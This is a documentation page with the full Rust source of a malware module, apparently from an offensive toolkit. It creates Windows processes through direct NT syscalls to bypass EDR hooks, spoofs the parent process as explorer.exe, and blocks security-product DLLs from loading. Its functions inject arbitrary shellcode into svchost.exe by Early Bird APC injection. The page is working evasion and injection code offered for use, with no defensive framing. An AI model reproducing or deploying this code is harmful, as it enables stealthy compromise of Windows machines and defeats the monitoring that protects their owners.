# crowd -- nt_create_process.rs  (S TIER -- pure NtCreateUserProcess via RecycledGate)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/nt_create_process.rs` |
| **Lines** | 545 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | NtCreateUserProcess direct |
| **Unsafe blocks** | 5 |

## Purpose

# crowd -- nt_create_process.rs  (S TIER -- pure NtCreateUserProcess via RecycledGate)

## Process Creation via NtCreateUserProcess

Direct NT-level process creation that bypasses the entire Win32 CreateProcessW
layer.  This avoids kernel32/kernelbase hooks that EDRs commonly instrument.

### Why NtCreateUserProcess over CreateProcessW
- `CreateProcessW` is the #1 hooked API by EDRs (CrowdStrike, SentinelOne, etc.)
- `NtCreateUserProcess` is the actual syscall -- going direct skips all
usermode hook chains in kernelbase!CreateProcessInternalW.
- Fewer ETW events from the Win32 subsystem are generated.
- A single call handles PPID spoofing + Block-DLL + suspend -- no need for
separate `InitializeProcThreadAttributeList` / `UpdateProcThreadAttribute`.

### Technique
1. Build `RTL_USER_PROCESS_PARAMETERS` via `RtlCreateProcessParametersEx`
2. Populate `PS_CREATE_INFO` (InitialState)
3. Build `PS_ATTRIBUTE_LIST` with:
- `PS_ATTRIBUTE_IMAGE_NAME` -- the NT image path
- `PS_ATTRIBUTE_PARENT_PROCESS` -- for PPID spoofing (optional)
- `PS_ATTRIBUTE_MITIGATION_OPTIONS` -- Block-DLL policy
- `PS_ATTRIBUTE_CLIENT_ID` -- to receive PID/TID
4. Invoke `NtCreateUserProcess` via RecycledGate (direct syscall through
ntdll gadget, no IAT entry)
5. Return process/thread handles + PID

### Integration with existing crate
- Uses `crate::recycled::nt_create_user_process()` for the syscall
- Uses `crate::recycled::nt_open_process()` for parent handle acquisition
- Uses `crate::recycled::nt_close()` for handle cleanup
- Uses `crate::ppid::find_pid_by_name()` for explorer.exe PID resolution
- Injection path uses `crate::recycled::nt_allocate_virtual_memory()`,
`nt_write_virtual_memory()`, `nt_protect_virtual_memory()`,
`nt_queue_apc_thread()`, `nt_resume_thread()`

## Constants

- `PS_ATTRIBUTE_IMAGE_NAME`: `usize` = `0x0002_0005`
- `PS_ATTRIBUTE_PARENT_PROCESS`: `usize` = `0x0006_0000`
- `PS_ATTRIBUTE_MITIGATION_OPTIONS`: `usize` = `0x0002_0010`
- `PS_ATTRIBUTE_CLIENT_ID`: `usize` = `0x0001_0003`
- `BLOCK_NON_MS_BINARIES_ALWAYS_ON`: `u64` = `0x0000_1000_0000_0000`
- `PROCESS_CREATE_FLAGS_SUSPENDED`: `u32` = `0x0000_0001`
- `PROCESS_CREATE_FLAGS_INHERIT_HANDLES`: `u32` = `0x0000_0004`
- `PROCESS_ALL_ACCESS`: `u32` = `0x001F_FFFF`
- `THREAD_ALL_ACCESS`: `u32` = `0x001F_FFFF`
- `PROCESS_CREATE_PROCESS`: `u32` = `0x0080`
- `PS_CREATE_INFO_SIZE`: `usize` = `88` — sizeof on Win10+ x64
- `MAX_ATTRIBUTES`: `usize` = `4`

## Types

### struct `PsCreateInfo` (line 101)

### struct `PsAttribute` (line 113)

### struct `PsAttributeList` (line 124)

### struct `ClientId` (line 133)

## Public API

### `create_suspended` `unsafe` (line 215)
```rust
pub unsafe fn create_suspended(
```
Create a process via NtCreateUserProcess in SUSPENDED state.

This is the pure NT-level replacement for the `CreateProcessW` +
`UpdateProcThreadAttribute` combo in `ppid.rs`.  Everything happens in a
single syscall via RecycledGate.

# Arguments
* `image_path`  -- Path to the target executable.  Can be a Win32 path
(e.g. `C:\Windows\System32\svchost.exe`) or an NT path
(e.g. `\??\C:\Windows\System32\svchost.exe`).
* `parent_pid`  -- Optional PID for PPID spoofing.  `None` means no spoof
(inherits current parent).  Use `Some(0)` to auto-select
explorer.exe.
* `block_dll`   -- If true, applies `BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`
mitigation policy so EDR DLLs cannot be loaded.

# Returns
`(process_handle, thread_handle, pid)` -- caller owns both handles.

# Safety
Calls raw NT syscalls.  Must run on Windows x86_64.

### `create_and_inject` `unsafe` (line 402)
```rust
pub unsafe fn create_and_inject(
```
Create a process via NtCreateUserProcess and inject shellcode before resume.

Combines `create_suspended()` with Early Bird APC injection:
1. Create process suspended (with optional PPID spoof + Block-DLL)
2. Allocate RW memory in target via NtAllocateVirtualMemory
3. Write shellcode via NtWriteVirtualMemory
4. Flip pages RW -> RX via NtProtectVirtualMemory
5. Queue APC to the main thread via NtQueueApcThread
6. Resume the thread via NtResumeThread

All steps use RecycledGate syscalls -- zero Win32 API calls in the injection
chain.  The process starts with Block-DLL policy applied (EDR DLLs cannot
load), and the APC fires before the PE entry point.

# Arguments
* `image_path`  -- Target executable path (Win32 or NT path)
* `shellcode`   -- Payload bytes to inject
* `parent_pid`  -- Optional PPID spoof target (`None` = no spoof,
`Some(0)` = auto explorer.exe)

# Returns
PID of the injected process.

# Safety
Calls raw NT syscalls and writes to remote process memory.

### `create_default_suspended` `unsafe` (line 529)
```rust
pub unsafe fn create_default_suspended() -> Result<(usize, usize, u32)>
```
Convenience: create a suspended svchost.exe with PPID spoof to explorer.exe
and Block-DLL policy.  Returns `(process_handle, thread_handle, pid)`.

### `inject_into_svchost` `unsafe` (line 538)
```rust
pub unsafe fn inject_into_svchost(shellcode: &[u8]) -> Result<u32>
```
Convenience: full injection chain into svchost.exe with PPID spoof.

## Internal Functions

- `open_parent_handle` (unsafe) (line 140)
- `build_nt_image_path` — Converts a user-provided path to an NT path UNICODE_STRING. (line 173)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use ntapi::ntrtl::{`
- `use winapi::shared::ntdef::UNICODE_STRING;`
- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd -- nt_create_process.rs  (S TIER -- pure NtCreateUserProcess via RecycledGate)
//!
//! ## Process Creation via NtCreateUserProcess
//!
//! Direct NT-level process creation that bypasses the entire Win32 CreateProcessW
//! layer.  This avoids kernel32/kernelbase hooks that EDRs commonly instrument.
//!
//! ### Why NtCreateUserProcess over CreateProcessW
//! - `CreateProcessW` is the #1 hooked API by EDRs (CrowdStrike, SentinelOne, etc.)
//! - `NtCreateUserProcess` is the actual syscall -- going direct skips all
//!   usermode hook chains in kernelbase!CreateProcessInternalW.
//! - Fewer ETW events from the Win32 subsystem are generated.
//! - A single call handles PPID spoofing + Block-DLL + suspend -- no need for
//!   separate `InitializeProcThreadAttributeList` / `UpdateProcThreadAttribute`.
//!
//! ### Technique
//! 1. Build `RTL_USER_PROCESS_PARAMETERS` via `RtlCreateProcessParametersEx`
//! 2. Populate `PS_CREATE_INFO` (InitialState)
//! 3. Build `PS_ATTRIBUTE_LIST` with:
//!    - `PS_ATTRIBUTE_IMAGE_NAME` -- the NT image path
//!    - `PS_ATTRIBUTE_PARENT_PROCESS` -- for PPID spoofing (optional)
//!    - `PS_ATTRIBUTE_MITIGATION_OPTIONS` -- Block-DLL policy
//!    - `PS_ATTRIBUTE_CLIENT_ID` -- to receive PID/TID
//! 4. Invoke `NtCreateUserProcess` via RecycledGate (direct syscall through
//!    ntdll gadget, no IAT entry)
//! 5. Return process/thread handles + PID
//!
//! ### Integration with existing crate
//! - Uses `crate::recycled::nt_create_user_process()` for the syscall
//! - Uses `crate::recycled::nt_open_process()` for parent handle acquisition
//! - Uses `crate::recycled::nt_close()` for handle cleanup
//! - Uses `crate::ppid::find_pid_by_name()` for explorer.exe PID resolution
//! - Injection path uses `crate::recycled::nt_allocate_virtual_memory()`,
//!   `nt_write_virtual_memory()`, `nt_protect_virtual_memory()`,
//!   `nt_queue_apc_thread()`, `nt_resume_thread()`

#![allow(dead_code, non_snake_case)]

use anyhow::{anyhow, Result};
use std::ffi::c_void;
use std::mem::{size_of, zeroed};
use std::ptr::null_mut;

use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlDestroyProcessParameters,
    RTL_USER_PROC_PARAMS_NORMALIZED,
};
use winapi::shared::ntdef::UNICODE_STRING;

#[allow(unused_imports)]
use crate::mega_dbg;

// ── PS_ATTRIBUTE constants ──────────────────────────────────────────────────
// These are the NT-internal attribute IDs for NtCreateUserProcess's PS_ATTRIBUTE_LIST.
// Not all are exposed by ntapi; we define them from ReactOS/Windows Internals sources.

/// Image name (NT path) -- input attribute, additive flag 0x20000 (PS_ATTRIBUTE_INPUT)
const PS_ATTRIBUTE_IMAGE_NAME: usize = 0x0002_0005;

/// Parent process handle for PPID spoofing
const PS_ATTRIBUTE_PARENT_PROCESS: usize = 0x0006_0000;

/// Mitigation options (Block-DLL, ACG, etc.)
/// Attribute number 0x20010 = PS_ATTRIBUTE_INPUT | PS_ATTRIBUTE_ADDITIVE | MitigationOptions(1)
const PS_ATTRIBUTE_MITIGATION_OPTIONS: usize = 0x0002_0010;

/// Client ID -- output attribute, receives the PID/TID of the new process
const PS_ATTRIBUTE_CLIENT_ID: usize = 0x0001_0003;

// ── Mitigation policy constants ─────────────────────────────────────────────

/// PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
/// Bit 44 set in the 64-bit mitigation flags
const BLOCK_NON_MS_BINARIES_ALWAYS_ON: u64 = 0x0000_1000_0000_0000;

// ── Process creation flags ──────────────────────────────────────────────────

/// PROCESS_CREATE_FLAGS_SUSPENDED (NtCreateUserProcess flag, not the same as
/// CREATE_SUSPENDED from CreateProcess)
const PROCESS_CREATE_FLAGS_SUSPENDED: u32 = 0x0000_0001;

/// PROCESS_CREATE_FLAGS_INHERIT_HANDLES -- we do not need handle inheritance
#[allow(dead_code)]
const PROCESS_CREATE_FLAGS_INHERIT_HANDLES: u32 = 0x0000_0004;

// ── Access rights ───────────────────────────────────────────────────────────

const PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
const PROCESS_CREATE_PROCESS: u32 = 0x0080;

// ── PS_CREATE_INFO ──────────────────────────────────────────────────────────
// Variable-size structure returned by NtCreateUserProcess.
// We only care about the `Size` and `State` fields for creation; the rest is
// output data we read after the call.  Use generous padding to cover all union
// members across Windows versions (10/11 22H2+).

const PS_CREATE_INFO_SIZE: usize = 88; // sizeof on Win10+ x64

#[repr(C)]
struct PsCreateInfo {
    size: usize,   // must be set to PS_CREATE_INFO_SIZE
    state: u32,    // PsCreateInitialState = 0 for creation
    _pad: [u8; 76], // union members -- zeroed for input, populated on output
}

// ── PS_ATTRIBUTE / PS_ATTRIBUTE_LIST ────────────────────────────────────────
// Each attribute carries a type tag, size, value (or pointer), and optional
// return-length pointer.

#[repr(C)]
#[derive(Copy, Clone)]
struct PsAttribute {
    attribute: usize,
    size: usize,
    value: usize,       // union: Value (usize) or *ValuePtr
    return_length: *mut usize,
}

/// We need at most 4 attributes: IMAGE_NAME, PARENT_PROCESS, MITIGATION, CLIENT_ID.
const MAX_ATTRIBUTES: usize = 4;

#[repr(C)]
struct PsAttributeList {
    total_length: usize,
    attributes: [PsAttribute; MAX_ATTRIBUTES],
}

// ── CLIENT_ID (output) ──────────────────────────────────────────────────────

#[repr(C)]
#[derive(Default)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

// ── Helper: open parent process handle via RecycledGate ─────────────────────

unsafe fn open_parent_handle(parent_pid: u32) -> Result<usize> {
    let mut h_parent: usize = 0;

    // OBJECT_ATTRIBUTES (6 pointer-sized fields, zeroed except Size)
    let mut oa: [usize; 6] = zeroed();
    oa[0] = size_of::<[usize; 6]>();

    // CLIENT_ID { UniqueProcess, UniqueThread }
    let mut cid = [parent_pid as usize, 0usize];

    let status = crate::recycled::nt_open_process(
        &mut h_parent,
        PROCESS_CREATE_PROCESS,
        oa.as_mut_ptr() as *mut c_void,
        cid.as_mut_ptr() as *mut c_void,
    );

    if status != 0 || h_parent == 0 {
        return Err(anyhow!(
            "NtOpenProcess(parent PID={}) failed: NTSTATUS 0x{:08x}",
            parent_pid,
            status as u32
        ));
    }

    Ok(h_parent)
}

// ── Helper: build NT image path UNICODE_STRING ──────────────────────────────

/// Converts a user-provided path to an NT path UNICODE_STRING.
/// If the path already starts with `\??\` it is used as-is.
/// Otherwise `\??\` is prepended (e.g. `C:\Windows\...` -> `\??\C:\Windows\...`).
fn build_nt_image_path(image_path: &str) -> (Vec<u16>, UNICODE_STRING) {
    let nt_path = if image_path.starts_with("\\??\\") {
        image_path.to_string()
    } else {
        format!("\\??\\{}", image_path)
    };

    let wide: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
    let byte_len = (wide.len() - 1) * 2; // exclude null terminator

    let us = UNICODE_STRING {
        Length: byte_len as u16,
        MaximumLength: (wide.len() * 2) as u16,
        Buffer: wide.as_ptr() as *mut u16,
    };

    (wide, us)
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Create a process via NtCreateUserProcess in SUSPENDED state.
///
/// This is the pure NT-level replacement for the `CreateProcessW` +
/// `UpdateProcThreadAttribute` combo in `ppid.rs`.  Everything happens in a
/// single syscall via RecycledGate.
///
/// # Arguments
/// * `image_path`  -- Path to the target executable.  Can be a Win32 path
///                    (e.g. `C:\Windows\System32\svchost.exe`) or an NT path
///                    (e.g. `\??\C:\Windows\System32\svchost.exe`).
/// * `parent_pid`  -- Optional PID for PPID spoofing.  `None` means no spoof
///                    (inherits current parent).  Use `Some(0)` to auto-select
///                    explorer.exe.
/// * `block_dll`   -- If true, applies `BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`
///                    mitigation policy so EDR DLLs cannot be loaded.
///
/// # Returns
/// `(process_handle, thread_handle, pid)` -- caller owns both handles.
///
/// # Safety
/// Calls raw NT syscalls.  Must run on Windows x86_64.
pub unsafe fn create_suspended(
    image_path: &str,
    parent_pid: Option<u32>,
    block_dll: bool,
) -> Result<(usize, usize, u32)> {
    mega_dbg!(
        "NtCreateProcess: image='{}' parent={:?} block_dll={}",
        image_path,
        parent_pid,
        block_dll
    );

    // ── 1. Build NT image path ──────────────────────────────────────────────
    let (_wide_buf, mut nt_image_us) = build_nt_image_path(image_path);

    // ── 2. Create RTL_USER_PROCESS_PARAMETERS ───────────────────────────────
    // RtlCreateProcessParametersEx needs a UNICODE_STRING for ImagePathName
    // and optionally CommandLine.  We use the image path for both.
    let mut params: *mut c_void = null_mut();
    let status = RtlCreateProcessParametersEx(
        &mut params as *mut *mut c_void as *mut _,
        &mut nt_image_us as *mut UNICODE_STRING as *mut _,
        null_mut(), // DllPath
        null_mut(), // CurrentDirectory
        &mut nt_image_us as *mut UNICODE_STRING as *mut _, // CommandLine = image path
        null_mut(), // Environment
        null_mut(), // WindowTitle
        null_mut(), // DesktopInfo
        null_mut(), // ShellInfo
        null_mut(), // RuntimeData
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );

    if status != 0 || params.is_null() {
        return Err(anyhow!(
            "RtlCreateProcessParametersEx failed: NTSTATUS 0x{:08x}",
            status as u32
        ));
    }

    mega_dbg!("NtCreateProcess: process parameters created at {:p}", params);

    // ── 3. PS_CREATE_INFO ───────────────────────────────────────────────────
    let mut create_info: PsCreateInfo = zeroed();
    create_info.size = PS_CREATE_INFO_SIZE;
    // state = 0 (PsCreateInitialState) -- already zeroed

    // ── 4. Build PS_ATTRIBUTE_LIST ──────────────────────────────────────────
    let mut attr_count: usize = 0;
    let mut attributes: [PsAttribute; MAX_ATTRIBUTES] = zeroed();
    let mut client_id: ClientId = ClientId::default();
    let mut mitigation_flags: u64 = 0;
    let mut h_parent: usize = 0;

    // Attribute: IMAGE_NAME (always required)
    attributes[attr_count] = PsAttribute {
        attribute: PS_ATTRIBUTE_IMAGE_NAME,
        size: nt_image_us.Length as usize,
        value: nt_image_us.Buffer as usize,
        return_length: null_mut(),
    };
    attr_count += 1;

    // Attribute: CLIENT_ID (always -- to receive PID/TID)
    attributes[attr_count] = PsAttribute {
        attribute: PS_ATTRIBUTE_CLIENT_ID,
        size: size_of::<ClientId>(),
        value: &mut client_id as *mut ClientId as usize,
        return_length: null_mut(),
    };
    attr_count += 1;

    // Attribute: PARENT_PROCESS (optional PPID spoofing)
    if let Some(mut ppid) = parent_pid {
        if ppid == 0 {
            ppid = crate::ppid::find_pid_by_name("explorer.exe")
                .ok_or_else(|| anyhow!("explorer.exe not found for PPID auto-spoof"))?;
        }
        mega_dbg!("NtCreateProcess: PPID spoof -> PID {}", ppid);

        h_parent = open_parent_handle(ppid)?;

        attributes[attr_count] = PsAttribute {
            attribute: PS_ATTRIBUTE_PARENT_PROCESS,
            size: size_of::<usize>(),
            value: h_parent,
            return_length: null_mut(),
        };
        attr_count += 1;
    }

    // Attribute: MITIGATION_OPTIONS (optional Block-DLL)
    if block_dll {
        mitigation_flags = BLOCK_NON_MS_BINARIES_ALWAYS_ON;

        attributes[attr_count] = PsAttribute {
            attribute: PS_ATTRIBUTE_MITIGATION_OPTIONS,
            size: size_of::<u64>(),
            value: &mut mitigation_flags as *mut u64 as usize,
            return_length: null_mut(),
        };
        attr_count += 1;

        mega_dbg!("NtCreateProcess: Block-DLL mitigation enabled");
    }

    // Compute total_length: header (usize) + attr_count * sizeof(PsAttribute)
    let total_length = size_of::<usize>() + attr_count * size_of::<PsAttribute>();

    let mut attr_list = PsAttributeList {
        total_length,
        attributes,
    };

    // ── 5. NtCreateUserProcess via RecycledGate ─────────────────────────────
    let mut h_process: usize = 0;
    let mut h_thread: usize = 0;

    let status = crate::recycled::nt_create_user_process(
        &mut h_process,
        &mut h_thread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        null_mut(),                                       // ProcessObjectAttributes
        null_mut(),                                       // ThreadObjectAttributes
        PROCESS_CREATE_FLAGS_SUSPENDED,                   // Always create suspended
        0,                                                // ThreadFlags = 0
        params,                                           // RTL_USER_PROCESS_PARAMETERS
        &mut create_info as *mut PsCreateInfo as *mut c_void,
        &mut attr_list as *mut PsAttributeList as *mut c_void,
    );

    // Cleanup: destroy process parameters
    RtlDestroyProcessParameters(params as *mut _);

    // Cleanup: close parent handle if we opened one
    if h_parent != 0 {
        crate::recycled::nt_close(h_parent);
    }

    if status != 0 {
        return Err(anyhow!(
            "NtCreateUserProcess failed: NTSTATUS 0x{:08x}",
            status as u32
        ));
    }

    if h_process == 0 || h_thread == 0 {
        return Err(anyhow!("NtCreateUserProcess returned null handles"));
    }

    let pid = client_id.unique_process as u32;
    mega_dbg!(
        "NtCreateProcess: success -- PID={} hProc=0x{:x} hThread=0x{:x}",
        pid,
        h_process,
        h_thread
    );

    Ok((h_process, h_thread, pid))
}

/// Create a process via NtCreateUserProcess and inject shellcode before resume.
///
/// Combines `create_suspended()` with Early Bird APC injection:
/// 1. Create process suspended (with optional PPID spoof + Block-DLL)
/// 2. Allocate RW memory in target via NtAllocateVirtualMemory
/// 3. Write shellcode via NtWriteVirtualMemory
/// 4. Flip pages RW -> RX via NtProtectVirtualMemory
/// 5. Queue APC to the main thread via NtQueueApcThread
/// 6. Resume the thread via NtResumeThread
///
/// All steps use RecycledGate syscalls -- zero Win32 API calls in the injection
/// chain.  The process starts with Block-DLL policy applied (EDR DLLs cannot
/// load), and the APC fires before the PE entry point.
///
/// # Arguments
/// * `image_path`  -- Target executable path (Win32 or NT path)
/// * `shellcode`   -- Payload bytes to inject
/// * `parent_pid`  -- Optional PPID spoof target (`None` = no spoof,
///                    `Some(0)` = auto explorer.exe)
///
/// # Returns
/// PID of the injected process.
///
/// # Safety
/// Calls raw NT syscalls and writes to remote process memory.
pub unsafe fn create_and_inject(
    image_path: &str,
    shellcode: &[u8],
    parent_pid: Option<u32>,
) -> Result<u32> {
    mega_dbg!(
        "NtCreateProcess+Inject: image='{}' shellcode={}B parent={:?}",
        image_path,
        shellcode.len(),
        parent_pid
    );

    // 1. Create suspended with Block-DLL always on
    let (h_process, h_thread, pid) = create_suspended(image_path, parent_pid, true)?;

    mega_dbg!("NtCreateProcess+Inject: PID={} -- beginning injection", pid);

    // 2. Allocate RW memory in target process
    let mut remote_addr: *mut c_void = null_mut();
    let mut region_size = shellcode.len();
    let status = crate::recycled::nt_allocate_virtual_memory(
        h_process,
        &mut remote_addr,
        0,
        &mut region_size,
        0x0000_3000, // MEM_COMMIT | MEM_RESERVE
        0x04,        // PAGE_READWRITE
    );

    if status < 0 || remote_addr.is_null() {
        crate::recycled::nt_terminate_process(h_process, 1);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_process);
        return Err(anyhow!(
            "NtAllocateVirtualMemory failed: NTSTATUS 0x{:08x}",
            status as u32
        ));
    }

    mega_dbg!(
        "NtCreateProcess+Inject: allocated {}B at {:p}",
        shellcode.len(),
        remote_addr
    );

    // 3. Write shellcode
    let mut written: usize = 0;
    let status = crate::recycled::nt_write_virtual_memory(
        h_process,
        remote_addr,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut written,
    );

    if status < 0 {
        // Cleanup on failure
        let mut base = remote_addr;
        let mut sz: usize = 0;
        crate::recycled::nt_free_virtual_memory(h_process, &mut base, &mut sz, 0x8000);
        crate::recycled::nt_terminate_process(h_process, 1);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_process);
        return Err(anyhow!(
            "NtWriteVirtualMemory failed: NTSTATUS 0x{:08x}",
            status as u32
        ));
    }

    // 4. Flip protection RW -> RX
    let mut base_prot = remote_addr;
    let mut prot_size = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        h_process,
        &mut base_prot,
        &mut prot_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );

    if status < 0 {
        mega_dbg!(
            "NtCreateProcess+Inject: NtProtectVirtualMemory RX failed (0x{:08x}) -- continuing",
            status as u32
        );
        // Non-fatal: some configurations may allow execution from RW pages
    }

    mega_dbg!("NtCreateProcess+Inject: shellcode written -- queuing APC");

    // 5. Queue APC to main thread (fires before PE entry point)
    let status = crate::recycled::nt_queue_apc_thread(
        h_thread,
        remote_addr as *mut c_void, // APC routine = shellcode address
        null_mut(),
        null_mut(),
        0,
    );

    if status < 0 {
        let mut base = remote_addr;
        let mut sz: usize = 0;
        crate::recycled::nt_free_virtual_memory(h_process, &mut base, &mut sz, 0x8000);
        crate::recycled::nt_terminate_process(h_process, 1);
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_process);
        return Err(anyhow!(
            "NtQueueApcThread failed: NTSTATUS 0x{:08x}",
            status as u32
        ));
    }

    // 6. Resume thread -- APC fires before PE entry point
    crate::recycled::nt_resume_thread(h_thread, null_mut() as *mut u32);

    mega_dbg!("NtCreateProcess+Inject: APC queued and thread resumed -- PID={}", pid);

    // Cleanup handles (process continues running)
    crate::recycled::nt_close(h_thread);
    crate::recycled::nt_close(h_process);

    Ok(pid)
}

/// Convenience: create a suspended svchost.exe with PPID spoof to explorer.exe
/// and Block-DLL policy.  Returns `(process_handle, thread_handle, pid)`.
pub unsafe fn create_default_suspended() -> Result<(usize, usize, u32)> {
    create_suspended(
        "C:\\Windows\\System32\\svchost.exe",
        Some(0), // auto explorer.exe
        true,    // Block-DLL
    )
}

/// Convenience: full injection chain into svchost.exe with PPID spoof.
pub unsafe fn inject_into_svchost(shellcode: &[u8]) -> Result<u32> {
    create_and_inject(
        "C:\\Windows\\System32\\svchost.exe",
        shellcode,
        Some(0), // auto explorer.exe
    )
}


```